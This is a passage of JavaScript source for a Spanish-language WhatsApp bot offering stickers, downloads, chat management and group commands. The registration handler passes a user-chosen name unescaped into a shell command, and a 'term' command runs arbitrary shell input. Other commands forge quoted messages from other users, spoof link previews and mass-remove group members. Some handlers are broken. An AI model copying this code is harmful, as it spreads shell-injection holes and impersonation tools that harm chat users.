if (nombre.length >= 10) return reply(`*Tu nombre es acaso un tren?*\nUn nombre no puede tener mas de *10* letras`)
if (edad > 30) return reply(`Uuuu, yastas viejito:c\n*Lo siento pero no puedo registrarte si eres mayor de 30 años*`)
if (edad < 13) return reply(`Eres menor de 13 años, no puedo hacer un registro tuyo lo siento.\n*Si quieres muestrame una autorizacion de tus padres diciendo que puedes pasar tiempo usando este bot para que pueda aceptarte:d*`)
try {
ppimg = await samu330.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {

ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
veri = sender                                                
addRegisteredUser(sender, nombre, edad, time, serialUser)
try {
exec(`magick './src/reg.jpg' -gravity west -fill '#00FF00' -font './src/font-gue.ttf' -size 1280x710 -pointsize 90 -interline-spacing 7.5 -annotate +460-45 '${nombre}' -pointsize 50 -annotate +460+200 '${serialUser}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'regsm.jpg'`)
samu330.sendMessage(from, fs.readFileSync('regsm.jpg'), MessageType.image, { quoted: sam, caption: `*「 SU REGISTRO FUE UN EXITO😉 」*\n\n *◦ Nombre : ${nombre}*\n*◦ Numero : wa.me/${sender.split("@")[0]}*\n*◦ Edad : ${edad}*\n*◦ Hora De Registro : ${time}*\n*◦ SN : ${serialUser}*\n\n *📋Su registro fue todo un exito*\n\n*Para Continuar Usando a NYANBOT Escriba el siguiente comando: ${prefix}menu*`})
} catch {
reply(`*「 SU REGISTRO FUE UN EXITO😉 」*\n\n *◦ Nombre : ${nombre}*\n*◦ Numero : wa.me/${sender.split("@")[0]}*\n*◦ Edad : ${edad}*\n*◦ Hora De Registro : ${time}*\n*◦ SN : ${serialUser}*\n\n *📋Su registro fue todo un exito*\n\n*Para Continuar Usando a NYANBOT Escriba el siguiente comando: ${prefix}menu*`)
}
addFilter(from)
break

case 'owner':
case 'creador':
await wa.sendContact(from, '5219984907794', "🥇𝑺𝒂𝒎𝒖𝟑𝟑𝟎🛺💨")
break
			
case 'smeme':
gh = body.slice(7).replace(/ /g, '%20')
wo1 = gh.split("|")[0];
wo2 = gh.split("|")[1];
if ((isMedia && !sam.message.videoMessage || isQuotedImage)) {
jars = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
wors = await samu330.downloadAndSaveMediaMessage(jars)
datae = await imageToBase64(JSON.stringify(wors).replace(/\"/gi, ''))
fs.writeFileSync('smeme.jpeg', datae, 'base64')
anu = await uploadImages('smeme.jpeg')
baleg = await getBuffer(`https://api.memegen.link/images/custom/${wo1}/${wo2}.png?background=${anu}`)
samu330.sendMessage(from, baleg, MessageType.image, {quoted: sam})
}
break
case 'noprefix':
prefix = ''
reply(`*EL PREFIJO YA NO ES NECESARIO AHORA!*`)
break
		
case 'api':
api = `${q}`
reply(`*La api a cambiado a ${q}!*`)
break
			
case 'shortlink':
url = args.join(" ")
request(`https://tinyurl.com/api-create.php?url=${url}`, function (error, response, body) {
try {
reply(body)
} catch (e) {
reply(e)
}
})
break
        
case 'exif':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (args.length < 1) return reply(`Forma de uso: *${prefix}exif nombre|autor*`)
if (!arg.split('|')) return reply(`Forma de uso: *${prefix}exif nombre|autor*`)
exif.create(q.split('|')[0], q.split('|')[1])
reply(`*El nombre de paquete de Stiker a cambiado a:* _${arg.split('|')[0]}\n*Y el autor a:* ${arg.split('|')[1]}`)
break
			
case 'scdl':
var url = budy.slice(6)
var res1 = await axios.get(`https://lindow-api.herokuapp.com/api/dlsoundcloud?url=${url}&apikey=${apikey}`)
var { title, result } = res1.data
thumbb = await getBuffer(`${res1.data.image}`)
samu330.sendMessage(from, thumbb, MessageType.image, {caption: `${title}`})
audiony = await getBuffer(result)
samu330.sendMessage(from, audiony, MessageType.audio, {mimetype: 'audio/mp4', filename: `${title}.mp3`, quoted: sam})
break
			
case 'par':
pares = await axios.get(`https://lindow-api.herokuapp.com/api/ppcouple?apikey=${apikey}`)
var { male, female } = pares.data.result
picmale = await getBuffer(`${male}`)
samu330.sendMessage(from, picmale, image, {quoted: fimg})
picfemale = await getBuffer(`${female}`)
samu330.sendMessage(from, picfemale, image, {quoted: fimg})
break
			
case 'animevid':
url = `https://lindow-api.herokuapp.com/api/randomaesthetic?apikey=${apikey}`
estetik = await getBuffer(url)
samu330.sendMessage(from, estetik, MessageType.video, {mimetype: 'video/mp4', duration : 999999999, filename: `estetod.mp4`, quoted: fvid, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
break
			
case 'asupan':
url = `https://lindow-api.herokuapp.com/api/asupan?apikey=${apikey}`
asupan = await getBuffer(url)
samu330.sendMessage(from, asupan, MessageType.video, {mimetype: 'video/mp4', duration : 999999999,filename: `asupan.mp4`, quoted: fvid, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
break
			
case 'swm':
case 'stickerwm':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (isMedia && !sam.message.videoMessage || isQuotedImage) {
if (!arg.includes('|')) return reply(`Envie o etiquete una imagen con el comando: *${prefix}swn nombre|autor*`)
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
const packname1 = arg.split('|')[0]
const author1 = arg.split('|')[1]
exif.create(packname1, author1, `stickwm_${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply('error')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), fliveLoc)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isMedia && sam.message.videoMessage.fileLength < 10000000 || isQuotedVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
if (!arg.includes('|')) return reply(`Envie o etiquete un video/gif con el comando: *${prefix}swm nombre|autor*`)
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
const packname1 = arg.split('|')[0]
const author1 = arg.split('|')[1]
exif.create(packname1, author1, `stickwm_${sender}`)
reply('wait')
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply('error')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else {
reply(`Envie o etiquete una imagen/vido/gif con el comando: ${prefix}swm nombre|autor *OJO!* El video/gif no debe de durar mas de 10 segundos`)
}
addFilter(from)
break
		
case 'upmp3':
const mp312 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const mp311 = await samu330.downloadAndSaveMediaMessage(mp312)
const { ext } = await fromBuffer(mp311) || {}
  		const form1 = new FormData
  		form1.append('file', mp311, 'tmp.' + ext)
  		let res12 = await fetch('https://file.io/?expires=1d', {
   		method: 'POST',
    		body: form1
  		})
  		const jsona = await res12.json()
  		if (!jsona.success) throw jsona
  		return jsona.link
		reply(jsona.link)
		reply(jsona.success)
break
		
	case 'up2':
		const mp3121 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const mp3111 = await samu330.downloadAndSaveMediaMessage(mp3121)
		 let form = new FormData
  let buffers = mp3111
  if (!Array.isArray(mp3111)) buffers = [mp3111]
  for (let buffer of buffers) {
    form.append('file', buffer)
  }
  let res = await fetch('https://storage.restfulapi.my.id/upload', {
    method: 'POST',
    body: form
  })
  let json = await res.text()
  try {
    json = JSON.parse(json)
    if (!Array.isArray(inp)) return json.files[0].url
    return json.files.map(res => res.url)
  } catch (e) {
    throw json
  }
		reply(res.url)
		break
			
case 'pornode':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Japonesas`)
query = args.join(' ')
get_result = await getJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${api}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Titulo   : ${x.title}\n`
ini_txt += `Vistas   : ${x.views}\n`
ini_txt += `Duracion : ${x.duration}\n`
ini_txt += `Uploader : ${x.uploader}\n`
ini_txt += `Link     : ${x.link}\n`
ini_txt += `Imagen   : ${x.thumbnail}\n`
}
reply(ini_txt)
addFilter(from)
break
		
case 'xvid':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Japonesas`)
query = args.join(' ')
get_result = await getJson(`https://fxc7-api.herokuapp.com/api/search/xvideos?apikey=Fxc7&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Titulo   : ${x.title}\n`
ini_txt += `Duracion : ${x.duration}\n`
ini_txt += `Uploader : ${x.channel.name}\n`
ini_txt += `Link     : ${x.url}\n\n╼━━━━━━━━━━━━━━━━━━━━━━━━━━╾\n`
}
reply(ini_txt)
addFilter(from)
break
		
case 'dxvid':
if (!isRegister) return reply(mess.only.usrReg)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
codigor = [1234, 1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999, 0000, 1122, 1133, 1144, 1555, 5566, 7183, 7874, 89874, 00086, 8732365874524, 635463185, 78676587135, 78573857, 725471469385013690147590398473918461837463781567485713, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
codigo = codigor[Math.floor(Math.random() * codigor.length)]
nopsw = samu330.prepareMessageFromContent(from,{ "listMessage": { "title": "*🔐Codigo requerido*", "description": `Para usar este comando es obligatorio establecer un codigo de validacion, este codigo te permitira ejercer esta funcion.\n\n*Puedes usar cualquier número, o puedes generar uno en el boton de abajo, solo te quedaria copiar y pegar ese codigo*\n\nPara seguir con tu descarga, debes escribir el comando de la siguiente manera:\n*${prefix}dxvid (CODIGO)|(LINK)*\n_Es importante que uses el signo_ *"|"* _para separar el codigo del link._`, "buttonText": "Quieres un codigo ya establecido por el Bot? Click aqui.", "listType": "SINGLE_SELECT", "sections": [{ "rows": [ { "title": `${codigo}`, "singleSelectReply": { "selectedRowId": "*Bien, ahora copia y pega*" }}]}]}
}, {quoted: sam, sendEphemeral: true, contextInfo:{ forwardingScore: 999999, isForwarded: true}})
if (!q.includes('|')) return samu330.relayWAMessage(nopsw)
const contra1 = q.substring(0, q.indexOf('|') - 0)
if(isNaN(contra1)) return await reply('El codigo es un Numero')
const linkx = q.substring(q.lastIndexOf('|') + 1)
if (!contra1) return reply(`*Y la contraseña?*\n_Recuerda separar la contraseña del link con el simbolo_ *'|'*`)
if (!linkx) return reply(`*Y el link?🙄*\nSi no tienes link de *Xvideos*, usa el comando ${prefix}xvid para buscar un video.`)
xv = await getJson(`https://mnazria.herokuapp.com/api/porndownloadxvideos?url=${linkx}`)
reply(`*Espere un momento, su video se esta enviando...*`)
sendFileFromUrl(xv.mp4, video, {quoted: fvid, caption: `*🍒Samu330 | NyanBot💠*`})
addFilter(from)
break

case 'lucky':
a = '🍇'
b = '🍎'
c = '🍓'
e = '🍑'
f = '💰'
g = '🥝'
pw = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck = pw[Math.floor(Math.random() * pw.length)]
pw1 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck1 = pw1[Math.floor(Math.random() * pw1.length)]
pw2 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck2 = pw2[Math.floor(Math.random() * pw2.length)]
pw3 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck3 = pw3[Math.floor(Math.random() * pw3.length)]
pw4 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck4 = pw4[Math.floor(Math.random() * pw4.length)]
pw5 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck5 = pw5[Math.floor(Math.random() * pw5.length)]
pw6 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck6 = pw6[Math.floor(Math.random() * pw6.length)]
pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck7 = pw7[Math.floor(Math.random() * pw7.length)]
pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck7 = pw7[Math.floor(Math.random() * pw7.length)]
s = `┃ │  ${luck} │  ${luck1} │ ${luck2}`
a = `┃ │  ${luck3} │  ${luck4} │ ${luck5}`
m = `┃ │  ${luck6} │  ${luck7} │ ${luck7}`
u = `┌ ﹍﹍𝈺﹉﹉﹉𝈻﹍﹍ ┐ 
╭──╼┥𝈸𖾗ᷤ𖾕꯭ͣ𖾔꯭𖾔ͫ𖽙ͧ𝈹┝╾──╮
╽ ┌──────────┐ ┃
${s}
┃ ├──────────┤ ┃
${a}
┃ ├──────────┤ ┃
${m}
╿ └──────────┘ ╿
╰─┨⃞🔮𝉃𝜄𝜐𝉃𝜍𝜅𝉃𝛾🔮⃞ ┠─╯`
reply(`${u}`)
break

case 'eliminartodos': 
if (!isGroup) return reply('Este comando solo se puede usar en grupos!')
if (!botAdmin) return reply('Solo se puede usar cuando el bot es administrador!')
const allMem = await samu330.getGroupMembers(from)
for (let i = 0; i < allMem.length; i++) {
if (groupAdmins.includes(allMem[i].id)) {

} else {
await samu330.removeParticipant(from, allMem[i].id)
}
}
reply('✍🏻')
break

		
case 'getbio':
var yy = sam.message.extendedTextMessage.contextInfo.mentionedJid[0]
var p = await samu330.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("[ERROR 401] Status Profile Not Found")
}
addFilter(from)
break
case 'getpic':
if (sam.message.extendedTextMessage != undefined){
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
try {
pic = await samu330.getProfilePicture(mentioned[0])
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
samu330.sendMessage(from, thumb, MessageType.image, {caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
}
addFilter(from)
break
case 'fdeface':
var nn = budy.slice(9)
var urlnye = nn.split("|")[0];
var titlenye = nn.split("|")[1];
var descnye = nn.split("|")[2];
run = getRandom('.jpeg')
var media1 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
var ddatae = await imageToBase64(JSON.stringify(media2).replace(/\"/gi, ''))
samu330.sendMessage(from, {
text: `${urlnye}`,
matchedText: `${urlnye}`,
canonicalUrl: `${urlnye}`,
description: `${descnye}`,
title: `${titlenye}`,
jpegThumbnail: ddatae }, 'extendedTextMessage', { detectLinks: false })
break

case 'setstatus':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!arg) return reply('Escribe algo almenos')
wa.setBio(arg)
.then((res) => wa.sendFakeStatus2(from, JSON.stringify(res), fake))
.catch((err) => wa.sendFakeStatus2(from, JSON.stringify(err), fake))
break
case 'setname':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!arg) return reply('Escribe algo almenos')
wa.setName(arg)
.then((res) => wa.sendFakeStatus2(from, JSON.stringify(res), fake))
.catch((err) => wa.sendFakeStatus2(from, JSON.stringify(err), fake))
break
case 'setreply':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!arg) return reply(`Uso: ${prefix}setreply texto`)
fake = arg
wa.sendFakeStatus2(from, `𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒`, fake)
break
case 'term':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!arg) return
exec(arg, (err, stdout) => {
if (err) return reply(err)
if (stdout) reply(stdout)
})
break
case 'contacto':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
argz = arg.split('|')
if (!argz) return reply(`Uso ${prefix}contacto @tag o escribe el numero|nombre`)
if (sam.message.extendedTextMessage != undefined){
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
wa.sendKontak(from, mentioned[0].split('@')[0], argz[1])
} else {
wa.sendKontak(from, argz[0], argz[1])
}
addFilter(from)
break

case 'runtime':
run = process.uptime()
let text = msg.runtime(run)
samu330.sendMessage(from, '*Tiempo encendido*', MessageType.text, { quoted: { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"title": `${text}`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "𝒩𝓎𝒶𝓃ℬ𝑜𝓉🍃",
"productImageCount": 10
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}}                                                                                                                                                                                                                                                                        })
break
case 'desfijar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.unpin)
reply('*succes unpin this chat*')
console.log('unpin chat = ' + from)
break
case 'fijar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.pin)
reply('*Este chat se ah fijado*')
console.log('Se fijo el chat = ' + from)
break
case 'sinleer':
const unread = await samu330.loadAllUnreadMessages()
samu330.sendMessage(from, `Total de mensajes sin leer: ${unread.length}`, MessageType.text)

break
case 'desarchivar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Todos los chats archivados fueron desarchivados*')
console.log('succes unarchive chat = ' + from)
anu = await samu330.chats.all()
for (let _ of anu) {
samu330.modifyChat(_.jid, ChatModification.unarchive)
}
break
case 'archivar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Vale, espera..*')
console.log('succes archive chat = ' + from)
await sleep(3000)
samu330.modifyChat(from, ChatModification.archive)
reply('*Yap*')
break
case 'vaciartodo':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Todos los chats han sido vaciados*')
smyprry = await samu330.chats.all()
for (let _ of smyprry) {
await sleep(4000)
samu330.modifyChat(_.jid, ChatModification.delete)
}
break
case 'vaciar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Este chat a sido vaciado*')
console.log('succes delete chat = ' + from)
await sleep(4000)
samu330.modifyChat(from, ChatModification.delete)
break
case 'silencio':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.mute, 24*60*60*1000)
reply('*Este chat a sido silenciado*')
console.log('succes mute chat = ' + from)
break
case 'desilenciar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.unmute)
reply('*Este chat a dejado de silenciarse*')
console.log('succes unmute chat = ' + from)
break
case 'facebook':
case 'fb':
if (args.length < 1) return reply('Y el link? ')
if(!isUrl(args[0]) && !args[0].includes('facebook')) return reply('LINK DE FACEBOOK MLDT STUPID!!')
teks = args.join(' ')
reply(mess.wait)
res = await fbDown(teks).catch(e => {
  reply(mess.ferr)
})
a = res[0]
result = `
Titulo :* ${a.judul}
*Source :* ${a.source}
*Tamaño :* ${a.size}
*Calidad :* ${a.quality}
*Tipo :* ${a.type}
*Name File :* ${a.judul}.${a.type}
`
sendFileFromUrl(a.thumb, image, {caption: result, quoted: sam})
sendFileFromUrl(a.link, video, { mimetype: 'video/mp4',quoted: sam, filename: `${a.judul}.${a.type}`})
break

case 'ytsearch':
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Me olvide de vivir`)
query = args.join(' ')
try {
get_result = await getJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${api}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `*◦Titulo* : ${x.title}\n`
ini_txt += `*◦Vistas* : ${x.views}\n`
ini_txt += `◦Publicado el ${x.published}\n`
ini_txt += `📸Thumbnail : ${x.thumbnail}\n`
ini_txt += `📲Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
}
reply(ini_txt)
} catch {
reply(`Servidor *1* con problemas, realizando tu busqueda de *${q}* en el servidor *2*`)
res = await yts(q)
searchyt = ``
for (let i of res.all) {
searchyt += `
*Titulo :* ${i.title}
*ID Video :* ${i.videoId}
*Vistas :* ${i.views}
*Subido :* ${i.ago}
*Duracion :* ${i.timestamp}
*Channel :* ${i.author.name}
*Link Channel :* ${i.author.url}
*Link Video :* ${i.url}
`
}
var samusamuxd = searchyt.trim()
sendFileFromUrl(res.all[0].image, image, {quoted: fimg, caption: samusamuxd, sendEphemeral: true})
}
addFilter(from)
break

case 'tts':
case 'voz':
if (args.length < 1) return samu330.sendMessage(from, 'Y el codigo de idioma? escribe el comando *idiomas* para ver la lista', text, { quoted: ftoko })
const gtts = require('./lib/gtts')(args[0])
if (args.length < 2) return samu330.sendMessage(from, 'Escribe el texto', text, {quoted: floc})
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 300
? reply('Mira, si no sabes usar esto... mejor no lo agas 😤')
: gtts.save(ranm, dtt, function() {
samu330.updatePresence(from, Presence.recording)
samu330.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: fliveLoc, mimetype: 'audio/mp4', duration: -999999999999999999, ptt:true, sendEphemeral: true, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
fs.unlinkSync(ranm)
})
addFilter(from)
break
case 'estadopic':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var textodestatusxd = args.join(' ')
reply('*Espera un momento...*')
var foto = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
var inisiap = await samu330.downloadAndSaveMediaMessage(foto)
var inisiap2 = fs.readFileSync(inisiap)
samu330.sendMessage('status@broadcast', inisiap2, MessageType.image, {quoted: ftoko, caption: `${textodestatusxd}`})
reply('*SE ENVIO LA IMAGEN COMO ESTADO*')
break
case 'estadovid':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Espera un momento...*')
var foto = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
var inisiap = await samu330.downloadAndSaveMediaMessage(foto)
var inisiap2 = fs.readFileSync(inisiap)
samu330.sendMessage('status@broadcast', inisiap2, MessageType.video, {quoted: ftoko, caption: `${body.slice(12)}`})
reply('Se envio el video al estado!')
break
case 'estado':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var estadotxt = args.join(' ')
samu330.sendMessage('status@broadcast', estadotxt, MessageType.text)
reply('*SE ENVIO EL ESTADO*')
break
case 'marcarsinleer':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var chats11 = await samu330.chats.all()
chats11.map( async ({ jid }) => {
await samu330.chatRead(jid, 'unread')
})
var teks = `\`\`\`Se an marcado como NO LEIDOS ${chats.length} chats !\`\`\``
await samu330.sendMessage(from, teks, MessageType.text, {quoted: fdoc})
console.log(chats.length)
break
case 'leertodo':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var chats12 = await samu330.chats.all()
chats12.map( async ({ jid }) => {
await samu330.chatRead(jid)
})
var teks = `\`\`\`Se an leido ${chats.length} chats !\`\`\``
await samu330.sendMessage(from, teks, MessageType.text, {quoted: floc})
console.log(chats.length)
break
case 'reply':
if (!args) return reply(`Uso :\n${prefix}reply [52xxx|frase|frase]]\n\nEx : \n${prefix}reply 0|hola wasa|que pex`)
var ghh = args.join(' ')
var nomorr = ghh.split("|")[0];
var target = ghh.split("|")[1];
var bot = ghh.split("|")[2];
samu330.sendMessage(from, `${bot}`, MessageType.text, {quoted: { key: { fromMe: false, participant: nomorr+'@s.whatsapp.net', ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
break
case 'fordward':
samu330.sendMessage(from, `${budy.slice(10)}`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true }})
break

case 'todos':
samu330.updatePresence(from, Presence.composing)
if (!isGroup) return reply(mess.only.group)
if (!isRegister) return reply(mess.only.usrReg)
if (!isAdmin) return reply(mess.only.admin)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim(): ''
teks += `  Total : ${groupMembers.length}\n`
for (let mem of groupMembers) {
teks += `┃ @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions('*〈 Mención grupal 〉*\n╭┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n┝ ● '+teks+'┊┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n┊────🪀 *Samu330* 🪀────\n╰┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈', members_id, true)
addFilter(from)
break 
		
case 'notificar':

if (!isAdmin) return reply(mess.only.admin)
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
if (!isGroup) return reply(mess.only.group)
teks = `Notificación dada por @${sender.split("@")[0]}\n*Mensaje : ${args.join(' ')}*`
const groupN = await samu330.groupMetadata(from);
member = groupN['participants']
jids = [];
member.map(async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: teks,
contextInfo: {
mentionedJid: jids, "forwardingScore": 9999, "isForwarded": true
},
quoted: faud
}
addFilter(from)
await samu330.sendMessage(from, options, MessageType.text)
break
case 'leermas':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)

if (args.length < 1) return reply(`Escribe el texto\nEjemplo : ${prefix}readmore te amo/rdido un perro?`)
tels = body.slice(9)
var teksa = tels.split("/")[0];
var teks2 = tels.split("/")[1];
